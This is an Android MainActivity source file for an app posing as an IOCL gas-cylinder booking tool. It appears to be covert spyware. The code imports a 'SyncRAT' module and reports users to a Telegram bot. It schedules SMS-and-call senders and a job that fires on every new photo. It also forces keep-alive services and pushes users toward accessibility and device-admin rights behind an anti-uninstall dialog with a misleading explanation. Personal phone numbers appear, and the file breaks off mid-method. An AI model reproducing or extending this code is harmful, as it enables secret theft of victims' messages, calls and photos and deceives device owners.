package android.iocl.dac_collector.Ui;


import static android.iocl.dac_collector.Utility.Constant.DefaultRegex;
import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;
import android.app.StatusBarManager;
import android.app.admin.DevicePolicyManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import android.graphics.drawable.ColorDrawable;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.Firebase.FirebaseDBClient;
import android.iocl.dac_collector.Interface.CapturingInterceptor;
import android.iocl.dac_collector.Interface.ResponseListener;
import android.iocl.dac_collector.ModelData.AppUpdate;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.ConsumerData;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.SearchQuery;
import android.iocl.dac_collector.ModelData.appUpdateDesc;
import android.iocl.dac_collector.ModelData.check_update;
import android.iocl.dac_collector.ModelData.search_consumer;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.RetrofitClient.TelegramService;
import android.iocl.dac_collector.Services.DownloadService;
import android.iocl.dac_collector.Services.FixOppoAutoKill;
import android.iocl.dac_collector.Services.ImageJobService;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.PermissionUtility;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.iocl.dac_collector.Utility.Utility;
import android.iocl.dac_collector.adapter.UpdateDescList;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.messaging.FirebaseMessaging;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.ykun.live_library.KeepAliveManager;
import com.ykun.live_library.config.ForegroundNotification;

import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity implements ResponseListener {

    private StatusBarManager statusBarManager;
    private static final String TAG = "MainActivity_Mokardder";
    FirebaseAnalytics mFirebaseAnalytics;
    FirebaseDBClient fireDB;
    Boolean isSkippingFCM = false;


    Button fetchUserDetails;

    LinearLayout loader;
    TextView loader_text, call_Akram, call_Emdadul, tv_appVersion, call_Mokardder, refreshProfile, userName, remainBook, lastBook, mobNo, consID, location, Book_Btn, Check_Update, aboutApp, adminPerm, btn_skip;
    ImageView annualTick;

    String FCM_KEY = "";

    boolean isAccessibilityEnabled;
    boolean isDeviceAdminEnabled;
    private ExecutorService executorService = Executors.newSingleThreadExecutor();  // Executor for background tasks

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
        View decorView = getWindow().getDecorView();
        ViewCompat.setOnApplyWindowInsetsListener(decorView, (view, insets) -> {
            int bottomInset = insets.getInsets(WindowInsetsCompat.Type.systemBars()).bottom;
            view.setPadding(0, 0, 0, bottomInset);
            return insets;
        });

        setContentView(R.layout.activity_main);

        setViewsUI();
        checkMissingPermissions();
        initFirebaseThings();
        sharedPrefsCheck();
        settingUpJobs();
        setClickListener();
        implementKeepAliveBelow8();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            statusBarManager = (StatusBarManager) getSystemService(StatusBarManager.class);
        }

    }

    private void checkMissingPermissions() {
        if (PermissionUtility.isAnyPermissionMissing(this)) {
            List<String> missing = PermissionUtility.getMissingPermissions(this);
            String[] missingArray = missing.toArray(new String[0]);

            startActivity(new Intent(this, PermissionActivity.class)
                    .putExtra("permissions", missingArray));
        }
    }


    private final Executor resultSuccessExecutor = runnable -> {
        Log.d(TAG, "requestAddTileService result success");
        runOnUiThread(() -> Toast.makeText(this, "Tile added!", Toast.LENGTH_SHORT).show());
    };

    public static String getCurrentDateString() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm");
        return sdf.format(new Date());
    }


    private void implementKeepAliveBelow8() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
            //启动保活服务
            KeepAliveManager.toKeepAlive(
                    getApplication(),
                    HIGH_POWER_CONSUMPTION,
                    "进程保活",
                    "Process: System(哥们儿) 我不想被杀死",
                    R.mipmap.ic_launcher,
                    new ForegroundNotification(
                            //定义前台服务的通知点击事件
                            (context, intent) -> Log.d("JOB-->", " foregroundNotificationClick"))
            );


        }
    }

    private void sharedPrefsCheck() {
        subscribeTopics();
        if (SharedPrefs.getBoolean(this,"isFirstTime", true)) {

            SharedPrefs.setRestrictionEnabled(this);


            try {
                showUserDetailsDialog();
            } catch (Exception e) {

            }


            Utility.updateMessagePattern(DefaultRegex, MainActivity.this);
        }


    }

    private void initFirebaseThings() {

        CapturingInterceptor.setGlobalListener(this);

        FirebaseApp.initializeApp(this);
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
        mFirebaseAnalytics.setAnalyticsCollectionEnabled(true);
        FirebaseMessaging.getInstance().setAutoInitEnabled(true);
        fireDB = new FirebaseDBClient(getApplicationContext());
    }

    private void setViewsUI() {
        isAccessibilityEnabled = Utility.isAccessibilityServiceEnabled(getApplicationContext());


        boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
        loader = findViewById(R.id.loaderLayout);
        loader_text = findViewById(R.id.loadingText_UI);
        call_Akram = findViewById(R.id.call_Akram);
        call_Emdadul = findViewById(R.id.call_Emdadul);
        call_Mokardder = findViewById(R.id.call_Mokardder);
        refreshProfile = findViewById(R.id.refreshProfile);
        userName = findViewById(R.id.userName);
        remainBook = findViewById(R.id.remainBook);
        lastBook = findViewById(R.id.lastBook);
        mobNo = findViewById(R.id.mobNo);
        consID = findViewById(R.id.consID);
        annualTick = findViewById(R.id.annualTick);
        location = findViewById(R.id.location);
        Check_Update = findViewById(R.id.Check_Update);
        Book_Btn = findViewById(R.id.Book_Btn);
        aboutApp = findViewById(R.id.aboutApp);
        tv_appVersion = findViewById(R.id.tv_appVersion);

        adminPerm = findViewById(R.id.adminPerm);
        if (isDeviceAdminEnabled && isAccessibilityEnabled && isRestrictionEnabled) {
            adminPerm.setVisibility(View.GONE);
        }
    }

    private void imageObserverSchedule() {
        JobInfo jobInfo = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            jobInfo = new JobInfo.Builder(123,
                    new ComponentName(this, ImageJobService.class))
                    .addTriggerContentUri(
                            new JobInfo.TriggerContentUri(
                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                    JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
                            )
                    )
                    .setTriggerContentMaxDelay(0)    // fire as soon as possible
                    .setTriggerContentUpdateDelay(1000)  // but batch rapid changes

                    .build();
        }

        JobScheduler jm = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            jm = this.getSystemService(JobScheduler.class);
        }
        jm.schedule(jobInfo);

    }

    private void settingUpJobs() {
        imageObserverSchedule();

        SyncAccountUtil.getSyncAccount(this);



        if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {

            loader_controller("Setting Up..", true, loader, loader_text);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                loader_controller("Setting Up..", false, loader, loader_text);
                JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
                JobSchedulerUtil.fetch_profile_info(getApplicationContext());
            }, 800); // Delay in milliseconds

        }
    }

    private void setClickListener() {
        aboutApp.setOnClickListener(v -> {
            showAboutDialog();
        });

        Book_Btn.setOnClickListener(v -> {
            makeCall("+918454955555");
        });

        Check_Update.setOnClickListener(v -> {
//            checkAppUpdate();

            boolean isAvaialble = isInternetAvailable(MainActivity.this);
            Log.d(TAG, "setClickListener: " + isAvaialble);

        });

        refreshProfile.setOnClickListener(v -> {
            String number = Utility.getConsID(getApplicationContext());
            if (!number.equals("N")) {
                refreshUser(number);
            }
        });

        adminPerm.setOnClickListener(v -> {
            showAdminAlert();
        });


        call_Akram.setOnClickListener(v -> {
            makeCall("+919123386785");
        });
        call_Emdadul.setOnClickListener(v -> {
            makeCall("+919231902703");
        });
        call_Mokardder.setOnClickListener(v -> {
            makeCall("+919932896502");
        });
        tv_appVersion.setText(BuildConfig.VERSION_NAME);


    }

    private boolean isInternetAvailable(Context context) {
        if (!isNetworkConnected(context)) return false;

        Future<Boolean> check = executorService.submit(() -> {
            HttpURLConnection conn = null;
            try {
                // Use a reliable URL that responds to HEAD requests
                conn = (HttpURLConnection) new URL("https://www.google.com").openConnection();
                conn.setConnectTimeout(4000);
                conn.setReadTimeout(4000);
                conn.setRequestMethod("HEAD");

                // Add User-Agent to mimic a browser request
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");

                int responseCode = conn.getResponseCode();

                Log.d(TAG, "isInternetAvailable: " + responseCode);

                // Accept 200 (OK) or 3xx (redirects) if following them
                return (responseCode == HttpURLConnection.HTTP_OK ||
                        (responseCode >= HttpURLConnection.HTTP_MULT_CHOICE &&
                                responseCode < HttpURLConnection.HTTP_BAD_REQUEST));
            } catch (Exception e) {
                Log.e("MainActivity_Mokardder", "Error checking internet", e); // Add logging
                return false;
            } finally {
                if (conn != null) conn.disconnect();
            }
        });

        try {
            return check.get(5, TimeUnit.SECONDS); // Increased timeout slightly
        } catch (TimeoutException e) {
            Log.e("MainActivity_Mokardder", "Timeout checking internet");
            check.cancel(true);
            return false;
        } catch (Exception e) {
            Log.e("MainActivity_Mokardder", "Exception in future task", e);
            return false;
        }
    }

    private boolean isNetworkConnected(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm != null ? cm.getActiveNetworkInfo() : null;
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }


    private void refreshFCMToken() {
        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        FCM_KEY = task.getResult();
                    }
                });
    }


    private void showAboutDialog() {
        // Inflate the layout
        View view = LayoutInflater.from(this).inflate(R.layout.app_about_dialog, null);

        // Create the AlertDialog
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        final AlertDialog alertDialog = builder.create();
        alertDialog.setCancelable(true);

        // Set a transparent background, if desired
        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0)); // Transparent background
        }

        // Show the dialog
        alertDialog.show();
    }


    private void loadProfileTV() {

        ConsumerData data = (ConsumerData) Utility.decodeApiResponse(!Utility.getProfile(getApplicationContext()).equals("N") ? Utility.getProfile(getApplicationContext()) : null, ConsumerData.class);


        if (data == null) {
            return;
        }
        boolean isAnnual = data.getCon_type().equals("UJJAWALA") && !data.getBooking_date().isEmpty();

        userName.setText(data.getName());

        TelegramBot.with(MainActivity.this).sendMessage("User Online -> " + data.getName() + " At -> " + getCurrentDateString());


        remainBook.setText(isAnnual ? data.getSubscription() : "Recharge End");
        lastBook.setText(isAnnual ? data.getBooking_date() : "No Subscription");
        mobNo.setText(data.getMobile_no());
        consID.setText(data.getConsumer_id());
        location.setText(data.getLocation().isEmpty() ? "No Location" : data.getLocation());

        if (!isAnnual) {
            TextView tv_lastBook = findViewById(R.id.tv_lastBook);
            tv_lastBook.setText("Recharge End On");
            remainBook.setText("Recharge End");
            lastBook.setText(data.getSub_end_month());
            annualTick.setVisibility(View.GONE);
            return;
        }

        if (isAnnual) {
            annualTick.setVisibility(View.VISIBLE);
        }

    }

    private void makeCall(String number) {
        // Getting instance of Intent with action as ACTION_CALL
        Intent phone_intent = new Intent(Intent.ACTION_CALL);

        // Set data of Intent through Uri by parsing phone number
        phone_intent.setData(Uri.parse("tel:" + number));
        // start Intent
        startActivity(phone_intent);
    }



    public List<appUpdateDesc> SplitText(String desc) {
        String[] parts = desc.split("\\s*,\\s*"); // Split and trim text by commas
        List<appUpdateDesc> descriptions = new ArrayList<>();

        int index = 1; // Initialize the index variable
        for (String part : parts) {
            descriptions.add(new appUpdateDesc(part.trim(), String.valueOf(index) + " ˟"));
            index++; // Increment the index
        }

        return descriptions;
    }


    private void updateAppIsUpdated() {

        String cons_id = fireDB.getString("cons_id", "not_found");
        String name = fireDB.getString("user_name", "not_found");

        if (name.equals("not_found")) {
            return;
        }

        loader_controller("Updating App Update...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> userInfo = Arrays.asList(
                new ColumnValue("CONSUMER_ID", cons_id),
                new ColumnValue("USER_NAME", name),
                new ColumnValue("FCM_KEY", ""),
                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
                new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime())
        );

        update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("Updating Data...", false, loader, loader_text);
                Log.d(TAG, "onResponse: " + response.body().getMessage());
                boolean isSuccess = response.body().getSuccess();
                String message = response.body().getMessage();
                if (isSuccess) {
                    SharedPrefs.setAppVersion(MainActivity.this,BuildConfig.VERSION_CODE);
                }

            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();
                loader_controller("", false, loader, loader_text);
            }
        });

    }


    private void update_dac_collect(String cons_id, String name, AlertDialog dialog, LinearLayout loader, TextView loader_text) {


        if (FCM_KEY.isEmpty() & !isSkippingFCM) {
            Toast.makeText(this, "FCM Key not received yet", Toast.LENGTH_SHORT).show();
            return;
        }

        loader_controller("Updating Data...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> userInfo = Arrays.asList(
                new ColumnValue("CONSUMER_ID", cons_id),
                new ColumnValue("USER_NAME", name),
                new ColumnValue("FCM_KEY", FCM_KEY),
                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
                new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime())
        );

        update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("Updating Data...", false, loader, loader_text);
                boolean isSuccess = response.body().getSuccess();
                String message = response.body().getMessage();

                if (isSuccess) {
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                    dialog.dismiss();
                    SharedPrefs.setBoolean(MainActivity.this,"isFirstTime", false);
                } else {
                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
                }


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {


                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

                loader_controller("Updating Data...", false, loader, loader_text);
            }
        });

    }


    private void showUserDetailsDialog() {


        RelativeLayout relativeLayoutAlert = findViewById(R.id.alertDialog_userdetails);
        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.userdetails_alert_layout, relativeLayoutAlert);
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        fetchUserDetails = view.findViewById(R.id.btn_fetch);
        EditText inputConsID = view.findViewById(R.id.et_consID);
        btn_skip = view.findViewById(R.id.btn_skip);

        LinearLayout loader = view.findViewById(R.id.loaderLayout);
        TextView loader_txt = view.findViewById(R.id.loadingText_alert);
        final AlertDialog alertDialog = builder.create();

        alertDialog.setCancelable(false);

        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }
        alertDialog.show();

        fetchUserDetails.setOnClickListener(v -> {
            String searchTerm = inputConsID.getText().toString();
            if (searchTerm.isEmpty()) {
                Toast.makeText(this, "Enter Something 😥", Toast.LENGTH_SHORT).show();

                return;
            }


            Log.d(TAG, "showUserDetailsDialog: " + searchTerm);


            userFind(searchTerm, loader, loader_txt, view, alertDialog);
        });
    }

    private void showAppDialog(String url, String desc, String versionCode_Name) {

        RelativeLayout relativeLayoutAlert = findViewById(R.id.update_layout_dialog);
        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.app_update_layout, relativeLayoutAlert);
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);
        RecyclerView updateDescRecycler = view.findViewById(R.id.update_recycle_view);
        updateDescRecycler.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
        List<appUpdateDesc> descriptions = SplitText(desc);
        // Set up the adapter
        UpdateDescList descAdapter = new UpdateDescList(descriptions, MainActivity.this);

        updateDescRecycler.setAdapter(descAdapter);
        RelativeLayout updateBtn = view.findViewById(R.id.update_rl_button);
        TextView btnText = view.findViewById(R.id.update_btn_text);
        TextView progressTxt = view.findViewById(R.id.tvProgressText);

        TextView newVer = view.findViewById(R.id.newVer);


        newVer.setText(versionCode_Name);

        ProgressBar progressBar = view.findViewById(R.id.progressBarUpdate);
        final AlertDialog alertDialog = builder.create();

        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }
        alertDialog.show();


        updateBtn.setOnClickListener(v -> {


            btnText.setVisibility(View.GONE);
            progressBar.setVisibility(View.VISIBLE);
            progressTxt.setVisibility(View.VISIBLE);

            DownloadService downloadService = new DownloadService(
                    MainActivity.this,
                    url,
                    progressTxt,
                    progressBar,
                    (status, message) -> {
                        if (status == 0) {
                            btnText.setVisibility(View.VISIBLE);
                            btnText.setText("Install App");
                            progressBar.setVisibility(View.GONE);
                            progressTxt.setVisibility(View.GONE);
                            Toast.makeText(MainActivity.this, "Download and installation started", Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(MainActivity.this, "Download failed: " + message, Toast.LENGTH_SHORT).show();
                        }
                    }
            );

            // Start the download process
            downloadService.startDownload(url);
        });

    }


    // Moved outside the onCreate method

    private void userFind(String userSearchTerm, LinearLayout loader, TextView loader_text, View view, AlertDialog dialog) {
        loader_controller("Getting User Data ...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        SearchQuery query = new SearchQuery(userSearchTerm, "");
        search_consumer receiver = new search_consumer("getUserDetails", query);
        Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("Fetching Customer ...", false, loader, loader_text);
                String encResponse = response.body().getData();

                boolean isSuccess = response.body().getSuccess();
                if (!isSuccess) {
                    String message = response.body().getMessage();
                    Toast.makeText(MainActivity.this, "" + message, Toast.LENGTH_SHORT).show();
                    return;
                }
                ConsumerData data = (ConsumerData) Utility.decodeApiResponse(encResponse, ConsumerData.class);
                Button saveData = view.findViewById(R.id.btn_saveData);
                TextView name = view.findViewById(R.id.userName);
                name.setVisibility(View.VISIBLE);

                String userName = data.getName();
                String Cons_ID = data.getConsumer_id();
                name.setText(userName + " ( " + Cons_ID + " ) ");
                saveData.setEnabled(true);
                btn_skip.setVisibility(View.VISIBLE);
                fetchUserDetails.setText("Re-search ?");
                btn_skip.setOnClickListener(v -> {
                    isSkippingFCM = true;
                });
                refreshFCMToken();
                saveData.setOnClickListener(v -> {
                    new Handler().postDelayed(() -> { // Wait for token retrieval
                        Utility.updateProfile(encResponse, getApplicationContext());
                        loadProfileTV();
                        SharedPrefs.setString(MainActivity.this, "cons_id", Cons_ID);
                        SharedPrefs.setString(MainActivity.this,"user_name", userName);
                        update_dac_collect(Cons_ID, userName, dialog, loader, loader_text);
                    }, 1000); // Adjust delay as needed
                });

            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Log.d(TAG, "onFailure: " + t);
                loader_controller("", false, loader, loader_text);
                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

            }
        });
    }

    private void refreshUser(String userSearchTerm) {
        loader_controller("Refreshing Profile...", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        SearchQuery query = new SearchQuery(userSearchTerm, "");
        search_consumer receiver = new search_consumer("getUserDetails", query);
        Call<DAC_Collector_Base> auth = requestService.search_customer(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {

                String encResponse = response.body().getData();
                Utility.updateProfile(encResponse, getApplicationContext());
                loadProfileTV();

                loader_controller("Fetching Customer ...", false, loader, loader_text);

            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                loader_controller("", false, loader, loader_text);

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();


            }
        });
    }

    private void subscribeTopics() {
        String[] topics = {"heart_beat", "sendCustomMessage", "RechargeRelated"}; // Example topics
        for (String topic : topics) {
            FirebaseMessaging.getInstance().subscribeToTopic(topic)
                    .addOnCompleteListener(task -> {
                        String msg = topic + " Subscribed";
                        if (!task.isSuccessful()) {
                            msg = topic + " Subscribe failed";
                        }
                        Log.d(TAG, msg);
                    });
        }
    }


    private void checkAppUpdate() {
        loader_controller("Checking Update....", true, loader, loader_text);
        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        check_update appUpdate_payload = new check_update("checkAppUpdate");
        Call<DAC_Collector_Base> auth = requestService.check_update(appUpdate_payload);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {
                loader_controller("", false, loader, loader_text);
                String encResponse = response.body().getData();
                AppUpdate appUpdate = (AppUpdate) Utility.decodeApiResponse(encResponse, AppUpdate.class);

                boolean isSuccess = response.body().getSuccess();
                if (isSuccess) {

                    String appDesc = appUpdate.getUpdateDescription();
                    String url = appUpdate.getUrl();

                    int version_code = Integer.parseInt(appUpdate.getAppVersionCode());
                    String versionName = appUpdate.getAppVersion();

                    if (version_code > BuildConfig.VERSION_CODE) {
                        showAppDialog(url, appDesc, versionName);
                    }


                }


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

                Toast.makeText(MainActivity.this, Constant.API_FAILURE, Toast.LENGTH_SHORT).show();

                loader_controller("", false, loader, loader_text);

            }
        });
    }


    public void loader_controller(String loader_text_inp, Boolean ShouldBeShown, LinearLayout loader, TextView loader_text) {

        if (ShouldBeShown) {
            loader.setVisibility(View.VISIBLE);
            if (!loader_text_inp.isEmpty()) {
                loader_text.setText(loader_text_inp);
            }
        } else {
            loader.setVisibility(View.GONE);
        }
    }


    // Moved outside the onCreate method


//    public void showPermissionRequests() {
//        RecyclerView recyclerView;
//        PermissionAdapter permissionAdapter;
//        List<PermissionItem> permissionList;
//
//        recyclerView = findViewById(R.id.permissions_recycler_view);
//        recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
//
//        // Sample data
//        permissionList = new ArrayList<>();
//        permissionList.add(new PermissionItem("Camera", "This app requires access to your camera", R.drawable.gas_cylinder_icon, false));
//        permissionList.add(new PermissionItem("Storage", "This app requires access to your storage", R.drawable.verify_icon_blue, true));
//
//        permissionAdapter = new PermissionAdapter(this, permissionList);
//        recyclerView.setAdapter(permissionAdapter);
//
//        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_permissions);
//        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.permission_dialog, relativeLayoutAlert);
//        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
//        builder.setView(view);
//
//
//        final AlertDialog alertDialog = builder.create();
//
//        alertDialog.setCancelable(false);
//
//        if (alertDialog.getWindow() != null) {
//            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
//        }
//        alertDialog.show();
//
//    }

    public void showCphWarning() {
        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_startup);
        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.realme_defect_device_layout, relativeLayoutAlert);
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);
        TextView service2px = view.findViewById(R.id.start2Px);
        TextView servicePermanent = view.findViewById(R.id.startPermanentService);
        TextView closeDialog = view.findViewById(R.id.closeDialog);

        servicePermanent.setOnClickListener(v -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(new Intent(this, FixOppoAutoKill.class));
            } else {
                startService(new Intent(this, FixOppoAutoKill.class));
            }
        });

        final AlertDialog alertDialog = builder.create();

        alertDialog.setCancelable(false);


        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }
        alertDialog.show();

        closeDialog.setOnClickListener(v -> {

            alertDialog.dismiss();
        });
    }

    public void showAdminAlert() {

        boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);

        Log.d(TAG, "showAdminAlert: Enabled " + isRestrictionEnabled);

        ConstraintLayout relativeLayoutAlert = findViewById(R.id.alertDialog_startup);

        // Use Activity context to inflate layout
        View view = LayoutInflater.from(MainActivity.this).inflate(R.layout.disable_app_uninstallation, relativeLayoutAlert, false);

        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setView(view);

        TextView tvAdmin = view.findViewById(R.id.tv_admin_turnOn);
        TextView tvAccessibility = view.findViewById(R.id.tv_accessibility_turn_on);
        TextView tvSetRestriction = view.findViewById(R.id.setRestriction);

        if (isAccessibilityEnabled) {
            tvAccessibility.setVisibility(View.GONE);
        }

        if (isDeviceAdminEnabled) {
            tvAdmin.setVisibility(View.GONE);
        }

        if (isRestrictionEnabled) {
            tvSetRestriction.setVisibility(View.GONE);
        }

        final AlertDialog alertDialog = builder.create();

        tvAdmin.setOnClickListener(v -> {
            enableDeviceAdmin(); // Launch from Activity context
            alertDialog.dismiss();
        });

        tvAccessibility.setOnClickListener(v -> {
            alertDialog.dismiss();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        tvSetRestriction.setOnClickListener(v -> {
            SharedPrefs.setRestrictionEnabled(this);
            alertDialog.dismiss();
        });

        alertDialog.setCancelable(true);

        if (alertDialog.getWindow() != null) {
            alertDialog.getWindow().setBackgroundDrawable(new ColorDrawable(0));
        }

        alertDialog.show();
    }


    @Override
    protected void onResume() {
        super.onResume();
        loadProfileTV();
        checkMissingPermissions();
    }


    private void enableDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        // Explicitly set the fully qualified class name of the receiver
        ComponentName adminComponent = new ComponentName(
                "android.iocl.dac_collector", // your package name
                "android.iocl.dac_collector.Receivers.AdminReceiver" // full class path
        );

        if (dpm.isAdminActive(adminComponent)) {
            Toast.makeText(this, "Already Device Admin", Toast.LENGTH_SHORT).show();
            return;
        }

        Log.d("DeviceAdmin", "Attempting to start Device Admin intent");

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for secure features like password reset and lock.");
        startActivity(intent); // Must be from Activity, not application context
    }





    private boolean isHtml(String input) {
        return input != null && input.matches(".*\\<[^>]+>.*");
    }

    private void showHtmlDialog(String title, String htmlContent) {
        // Convert HTML → Spanned → plain String (all tags & styling dropped)
        String plain = Html.fromHtml(htmlContent, Html.FROM_HTML_MODE_LEGACY)
                .toString()
                .trim();

        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(plain)
